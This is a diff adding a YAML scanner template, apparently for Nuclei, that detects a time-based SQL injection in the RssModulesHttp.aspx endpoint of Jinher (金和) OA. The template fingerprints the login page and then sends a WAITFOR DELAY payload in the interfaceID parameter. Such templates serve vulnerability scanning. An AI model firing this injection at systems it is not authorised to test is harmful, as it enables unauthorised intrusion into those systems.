@@ -1,0 +1,47 @@
+id: poc-yaml-jinher-rssmoduleshttp-aspx-sqli
+info:
+  name: 金和OA RssModulesHttp.aspx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Identifies an SQL injection vulnerability in the `RssModulesHttp.aspx` endpoint of the 金和OA application.
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 1}}"
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "c6/Jhsoft.Web.login"
+        part: body
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        GET /C6/JHSoft.Web.WorkFlat/RssModulesHttp.aspx/?interfaceID=-1;WAITFOR+DELAY+'0:0:{{t1}}'-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "^[^<]*$"
+        part: body
+      - type: dsl
+        dsl:
+          - duration >= to_number(t1)
+          - duration <= to_number(t2)
